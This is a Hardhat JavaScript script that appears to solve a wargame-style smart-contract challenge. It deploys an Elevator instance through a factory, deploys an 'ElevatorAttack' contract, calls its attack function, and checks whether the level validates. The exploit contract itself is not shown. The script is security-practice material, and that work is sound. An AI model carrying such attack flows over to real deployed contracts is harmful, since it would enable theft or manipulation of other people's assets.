const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();

    // deploy Factory
    const Factory = await ethers.getContractFactory("ElevatorFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();

    // deploy contract
    const receipt = await factory.connect(player).createInstance(player.address);
    const instance_address = (await receipt.wait()).events[0].args[0];
    const elevator = await ethers.getContractAt("Elevator", instance_address, owner);

    // deploy attack
    const Attack = await ethers.getContractFactory("ElevatorAttack");
    const attack = await Attack.connect(player).deploy();
    await attack.deployed();

    await attack.attack(elevator.address);

    const res = await factory.validateInstance(elevator.address, player.address);

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});


